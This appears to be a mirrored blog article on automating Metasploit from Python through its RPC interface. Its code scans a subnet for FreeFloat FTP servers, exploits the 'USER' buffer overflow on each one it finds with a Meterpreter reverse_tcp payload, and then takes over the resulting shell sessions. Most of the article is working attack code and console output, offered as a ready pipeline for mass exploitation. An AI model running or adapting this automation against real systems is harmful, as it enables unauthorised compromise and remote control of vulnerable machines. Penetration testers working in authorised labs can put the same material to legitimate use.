<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Automate attacker's actions using metasploit and Python</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Metaploit is known to be written in Ruby and does not support scripts written in Python. Despite this, the meta-exploit has a two-way RPC-interface wi...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Automate attacker's actions using metasploit and Python</h1><div class="post__text post__text-html js-mediator-article">  Metaploit is known to be written in Ruby and does not support scripts written in Python.  Despite this, the meta-exploit has a two-way RPC-interface with which you can run tasks. <br><br>  There are two libraries that allow you to interact with the remote procedure call (RPC) metasploit - this is <a href="https://github.com/allfro/pymetasploit">pymetasploit from allfro</a> and <a href="https://github.com/SpiderLabs/msfrpc/tree/master/python-msfrpc">python-msfrpc from SpiderLabs</a> .  This article uses the first one.  On the Internet and the github pymetasploit repository there are <a href="https://github.com/allfro/pymetasploit">examples of</a> launching exploits and interacting with established sessions, but I could not find examples of launching scanners and getting output for further processing of the results.  One of the options will be discussed below. <br><a name="habracut"></a><br>  Install the library: <br><br><pre><code class="bash hljs">git <span class="hljs-built_in"><span class="hljs-built_in">clone</span></span> https://github.com/allfro/pymetasploit</code> </pre> <br>  At the time of this writing, I did not have a connection to msfrpc without this <a href="https://github.com/Mikaayenson/pymetasploit/commit/e493c36ebae079e55aad343346a55b6240c56fb2">commit</a> . 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> pymetasploit python setup.py install</code> </pre> <br>  Run the RPC listener: <br><br><pre> <code class="bash hljs">root@kali-template:~<span class="hljs-comment"><span class="hljs-comment"># msfrpcd -h Usage: msfrpcd &lt;options&gt; OPTIONS: -P &lt;opt&gt; Specify the password to access msfrpcd -S Disable SSL on the RPC socket -U &lt;opt&gt; Specify the username to access msfrpcd -a &lt;opt&gt; Bind to this IP address -f Run the daemon in the foreground -h Help banner -n Disable database -p &lt;opt&gt; Bind to this port instead of 55553 -t &lt;opt&gt; Token Timeout (default 300 seconds) -u &lt;opt&gt; URI for Web server root@kali-template:~# msfrpcd -P password -n -f -a 127.0.0.1 [*] MSGRPC starting on 127.0.0.1:55553 (SSL):Msg... [*] MSGRPC ready at 2018-03-28 14:34:10 +0300.</span></span></code> </pre> <br>  Now Metaslpoit RPC listens locally on the default port 55553. <br><br><h2>  Task to automate </h2><br>  Suppose there is a subnet 192.168.0.0/24.  It is known that several ftp servers are available in it.  You need to check if any of them are <a href="https://www.exploit-db.com/exploits/23243/">affected by the Freefloat FTP Server - 'USER' Remote Buffer Overflow</a> .  When detected, exploit the vulnerability and get the shell of the vulnerable machine. <br><br>  Import the necessary classes <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> metasploit.msfrpc <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> MsfRpcClient <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> metasploit.msfconsole <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> MsfRpcConsole</code> </pre> <br>  To interact with RPC, only MsfRpcClient is sufficient, but to get the output of the scanning modules, interaction with the meta-layer console is needed, therefore we also import MsfRpcConsole. <br><br>  Connect to the RPC listener, pass the password.  Port and address are used by default. <br><br><pre> <code class="python hljs">client = MsfRpcClient(<span class="hljs-string"><span class="hljs-string">'password'</span></span>)</code> </pre> <br>  Connect to the metasploit console, by default the console messages are output to the standard output and displayed on the screen.  To ‚Äúcatch‚Äù this data and use it in the future, the MsfRpcConsole class uses the callback function, which is passed through the cb = parameter.  Thus, each time the data for display comes to the console, the read_console function will be called. <br><br><pre> <code class="python hljs">console = MsfRpcConsole(client, cb=read_console)</code> </pre> <br>  The data comes in this format: <br><br><pre> <code class="python hljs">In [<span class="hljs-number"><span class="hljs-number">6</span></span>]: console.console.read() Out[<span class="hljs-number"><span class="hljs-number">6</span></span>]: {<span class="hljs-string"><span class="hljs-string">'busy'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, <span class="hljs-string"><span class="hljs-string">'data'</span></span>: <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'prompt'</span></span>: <span class="hljs-string"><span class="hljs-string">'msf &gt; '</span></span>}</code> </pre> <br>  We define the read_console function so that the received data is available from the main program code.  Define two global variables: <br><br><ul><li>  global_console_status to monitor whether the module is still running; </li><li>  global_positive_out to accumulate positive results. </li></ul><br>  The read_console function will assign the value of the ¬¥busy¬¥ key to the global variable global_console_status and check whether the [+] symbol, which usually indicates a positive result of the module‚Äôs execution, is contained in the data ¬¥data¬¥ key.  If the result is positive, the line containing [+] is added to the global_positive_out list: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">global</span></span> global_positive_out global_positive_out = list() <span class="hljs-keyword"><span class="hljs-keyword">global</span></span> global_console_status global_console_status = <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">read_console</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(console_data)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">global</span></span> global_console_status global_console_status = console_data[<span class="hljs-string"><span class="hljs-string">'busy'</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> global_console_status <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-string"><span class="hljs-string">'[+]'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> console_data[<span class="hljs-string"><span class="hljs-string">'data'</span></span>]: sigdata = console_data[<span class="hljs-string"><span class="hljs-string">'data'</span></span>].rstrip().split(<span class="hljs-string"><span class="hljs-string">'\n'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> line <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> sigdata: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-string"><span class="hljs-string">'[+]'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> line: global_positive_out.append(line) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> console_data[<span class="hljs-string"><span class="hljs-string">'data'</span></span>]</code> </pre> <br>  Now we will execute in the console the commands necessary to start the auxiliary of the ftp_version module. <br><br><pre> <code class="python hljs">console.execute(<span class="hljs-string"><span class="hljs-string">'use auxiliary/scanner/ftp/ftp_version'</span></span>) console.execute(<span class="hljs-string"><span class="hljs-string">'set RHOSTS 192.168.0.0/24'</span></span>) console.execute(<span class="hljs-string"><span class="hljs-string">'set THREADS 20'</span></span>) console.execute(<span class="hljs-string"><span class="hljs-string">'run'</span></span>) time.sleep(<span class="hljs-number"><span class="hljs-number">5</span></span>)</code> </pre> <br>  We will wait for the completion of the module execution, checking whether the console is busy every 5 seconds: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">while</span></span> global_console_status: time.sleep(<span class="hljs-number"><span class="hljs-number">5</span></span>)</code> </pre> <br>  After the module is completed, we will process the results and extract the IP addresses of hosts affected by the vulnerability: <br><br><pre> <code class="python hljs">targets = list() <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> line <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> global_positive_out: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-string"><span class="hljs-string">'FreeFloat'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> line: ip = re.findall(<span class="hljs-string"><span class="hljs-string">r'[0-9]+(?:\.[0-9]+){3}'</span></span>, line)[<span class="hljs-number"><span class="hljs-number">0</span></span>] targets.append(ip)</code> </pre><br>  To exploit the found vulnerabilities, create an exploit object.  To see which options the exploit has and which ones are required, you can use the exploit.options and exploit.required methods.  Install LPORT, LHOST and EXITFUNC: <br><br><pre> <code class="python hljs">In [<span class="hljs-number"><span class="hljs-number">4</span></span>]: exploit.required Out[<span class="hljs-number"><span class="hljs-number">4</span></span>]: [<span class="hljs-string"><span class="hljs-string">'RHOST'</span></span>, <span class="hljs-string"><span class="hljs-string">'SSLVersion'</span></span>, <span class="hljs-string"><span class="hljs-string">'ConnectTimeout'</span></span>, <span class="hljs-string"><span class="hljs-string">'FTPTimeout'</span></span>, <span class="hljs-string"><span class="hljs-string">'RPORT'</span></span>] In [<span class="hljs-number"><span class="hljs-number">5</span></span>]: exploit.options Out[<span class="hljs-number"><span class="hljs-number">5</span></span>]: [<span class="hljs-string"><span class="hljs-string">'FTPDEBUG'</span></span>, <span class="hljs-string"><span class="hljs-string">'ContextInformationFile'</span></span>, <span class="hljs-string"><span class="hljs-string">'WORKSPACE'</span></span>, <span class="hljs-string"><span class="hljs-string">'FTPPASS'</span></span>, <span class="hljs-string"><span class="hljs-string">'FTPUSER'</span></span>, <span class="hljs-string"><span class="hljs-string">'CHOST'</span></span>, <span class="hljs-string"><span class="hljs-string">'RHOST'</span></span>, <span class="hljs-string"><span class="hljs-string">'Proxies'</span></span>, <span class="hljs-string"><span class="hljs-string">'DisablePayloadHandler'</span></span>, <span class="hljs-string"><span class="hljs-string">'TCP::send_delay'</span></span>, <span class="hljs-string"><span class="hljs-string">'SSLVersion'</span></span>, <span class="hljs-string"><span class="hljs-string">'ConnectTimeout'</span></span>, <span class="hljs-string"><span class="hljs-string">'CPORT'</span></span>, <span class="hljs-string"><span class="hljs-string">'SSLVerifyMode'</span></span>, <span class="hljs-string"><span class="hljs-string">'FTPTimeout'</span></span>, <span class="hljs-string"><span class="hljs-string">'VERBOSE'</span></span>, <span class="hljs-string"><span class="hljs-string">'SSLCipher'</span></span>, <span class="hljs-string"><span class="hljs-string">'SSL'</span></span>, <span class="hljs-string"><span class="hljs-string">'WfsDelay'</span></span>, <span class="hljs-string"><span class="hljs-string">'TCP::max_send_size'</span></span>, <span class="hljs-string"><span class="hljs-string">'EnableContextEncoding'</span></span>, <span class="hljs-string"><span class="hljs-string">'RPORT'</span></span>] exploit = client.modules.use(<span class="hljs-string"><span class="hljs-string">'exploit'</span></span>, <span class="hljs-string"><span class="hljs-string">'windows/ftp/freefloatftp_user'</span></span>) pl = client.modules.use(<span class="hljs-string"><span class="hljs-string">'payload'</span></span>, <span class="hljs-string"><span class="hljs-string">'windows/meterpreter/reverse_tcp'</span></span>) pl[<span class="hljs-string"><span class="hljs-string">'LPORT'</span></span>] = <span class="hljs-number"><span class="hljs-number">443</span></span> pl[<span class="hljs-string"><span class="hljs-string">'LHOST'</span></span>] = localhost pl[<span class="hljs-string"><span class="hljs-string">'EXITFUNC'</span></span>] = <span class="hljs-string"><span class="hljs-string">'thread'</span></span></code> </pre> <br>  To run, you must call the execute () method, passing the previously initialized payload: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> target <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> targets: exploit[<span class="hljs-string"><span class="hljs-string">'RHOST'</span></span>] = target ftpsession = exploit.execute(payload=pl) time.sleep(<span class="hljs-number"><span class="hljs-number">5</span></span>)</code> </pre> <br>  If successfully launched, the key job_id will contain a number, if unsuccessful, it will contain None. <br><br><pre> <code class="python hljs">{<span class="hljs-string"><span class="hljs-string">'job_id'</span></span>: <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-string"><span class="hljs-string">'uuid'</span></span>: <span class="hljs-string"><span class="hljs-string">'uv0ontph'</span></span>}</code> </pre> <br>  Upon receipt of the session, client.sessions.list will contain the session number and parameters specific to this session in the format below: <br><br><pre> <code class="python hljs">{<span class="hljs-number"><span class="hljs-number">1</span></span>: {<span class="hljs-string"><span class="hljs-string">'info'</span></span>: <span class="hljs-string"><span class="hljs-string">'SEMYON-FE434C23\\Administrator @ SEMYON-FE434C23'</span></span>, <span class="hljs-string"><span class="hljs-string">'username'</span></span>: <span class="hljs-string"><span class="hljs-string">'root'</span></span>, <span class="hljs-string"><span class="hljs-string">'session_port'</span></span>: <span class="hljs-number"><span class="hljs-number">21</span></span>, <span class="hljs-string"><span class="hljs-string">'via_payload'</span></span>: <span class="hljs-string"><span class="hljs-string">'payload/windows/meterpreter/reverse_tcp'</span></span>, <span class="hljs-string"><span class="hljs-string">'uuid'</span></span>: <span class="hljs-string"><span class="hljs-string">'azxxoup4'</span></span>, <span class="hljs-string"><span class="hljs-string">'tunnel_local'</span></span>: <span class="hljs-string"><span class="hljs-string">'192.168.0.92:443'</span></span>, <span class="hljs-string"><span class="hljs-string">'via_exploit'</span></span>: <span class="hljs-string"><span class="hljs-string">'exploit/windows/ftp/freefloatftp_user'</span></span>, <span class="hljs-string"><span class="hljs-string">'arch'</span></span>: <span class="hljs-string"><span class="hljs-string">'x86'</span></span>, <span class="hljs-string"><span class="hljs-string">'exploit_uuid'</span></span>: <span class="hljs-string"><span class="hljs-string">'uv0ontph'</span></span>, <span class="hljs-string"><span class="hljs-string">'tunnel_peer'</span></span>: <span class="hljs-string"><span class="hljs-string">'192.168.0.90:4418'</span></span>, <span class="hljs-string"><span class="hljs-string">'platform'</span></span>: <span class="hljs-string"><span class="hljs-string">'windows'</span></span>, <span class="hljs-string"><span class="hljs-string">'workspace'</span></span>: <span class="hljs-string"><span class="hljs-string">'false'</span></span>, <span class="hljs-string"><span class="hljs-string">'routes'</span></span>: <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'target_host'</span></span>: <span class="hljs-string"><span class="hljs-string">'192.168.0.90'</span></span>, <span class="hljs-string"><span class="hljs-string">'type'</span></span>: <span class="hljs-string"><span class="hljs-string">'meterpreter'</span></span>, <span class="hljs-string"><span class="hljs-string">'session_host'</span></span>: <span class="hljs-string"><span class="hljs-string">'192.168.0.90'</span></span>, <span class="hljs-string"><span class="hljs-string">'desc'</span></span>: <span class="hljs-string"><span class="hljs-string">'Meterpreter'</span></span>}}</code> </pre> <br>  In this case, the reverse session of the mega-explorer was chosen as the payload of the exploit.  In order to determine whether the connection has come, you need to check whether there are new sessions in client.sessions.list.  The key in this case is the exploit uuid, which should be equal to the exploit_uuid session.  To implement, we define two functions for searching for new sessions, compare_sessions, which will wait the specified time and compare the old list of sessions with the current one and get_session, which will return the session corresponding to the launched exploit. <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">get_session</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(sessions_list, exploit_job)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> sessions_list: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> session <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> sessions_list: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> sessions_list[session][<span class="hljs-string"><span class="hljs-string">'exploit_uuid'</span></span>] == exploit_job[<span class="hljs-string"><span class="hljs-string">'uuid'</span></span>]: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> session <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">compare_sessions</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(old_sessions_list, seconds = </span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">120</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> flag = <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> flag: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> seconds == <span class="hljs-number"><span class="hljs-number">0</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> client.sessions.list != old_sessions_list: flag = <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> time.sleep(<span class="hljs-number"><span class="hljs-number">1</span></span>) seconds -= <span class="hljs-number"><span class="hljs-number">1</span></span> current_sessions = client.sessions.list all(map(current_sessions.pop, old_sessions_list)) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> current_sessions</code> </pre> <br>  Save the current sessions, run the exploit: <br><br><pre> <code class="python hljs">old_sessions = client.sessions.list ftpsession = exploit.execute(payload=pl) time.sleep(<span class="hljs-number"><span class="hljs-number">5</span></span>) ftpsessioncode = get_session(client.sessions.list, ftpsession) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> ftpsessioncode: sys.exit()</code> </pre><br>  After receiving the session, we can interact with it by calling client.sessions.session () and passing the session number.  Using the methods shell.read (), shell.write (), shell.runsingle (), you can send commands and read the response from the session meter. <br><br><pre> <code class="python hljs">shell = client.sessions.session(ftpsessioncode) shell.read()</code> </pre> <br>  Using the described technique, you can run any available modules and get output from the console. <br><br>  The code is available in the githab <a href="https://github.com/vmvarga/msfpython-scripts/blob/master/task1.py">repository</a> . </div><p>Source: <a href="https://habr.com/ru/post/353642/">https://habr.com/ru/post/353642/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../353632/index.html">Learn OpenGL. Lesson 5.2 - Gamma Correction</a></li>
<li><a href="../353634/index.html">PushAll as a partial Telegram replacement</a></li>
<li><a href="../353636/index.html">And again about blocking Telegram. Deploy your own VPN</a></li>
<li><a href="../353638/index.html">Connecting Avaya IP Phones to IP PBX 3CX</a></li>
<li><a href="../353640/index.html">Checking the source C # Unity code</a></li>
<li><a href="../353648/index.html">Useful VPN features</a></li>
<li><a href="../353650/index.html">Fintech Digest: a trillion rubles to the wind, a bank branch managed by robots and PayPal as a bank</a></li>
<li><a href="../353652/index.html">Not a bot yet, but already something - we receive notifications from Zabbix to instant messengers</a></li>
<li><a href="../353654/index.html">Why SQLite does not use Git</a></li>
<li><a href="../353656/index.html">Lessons learned in creating the first game, and why I want to write my own engine</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>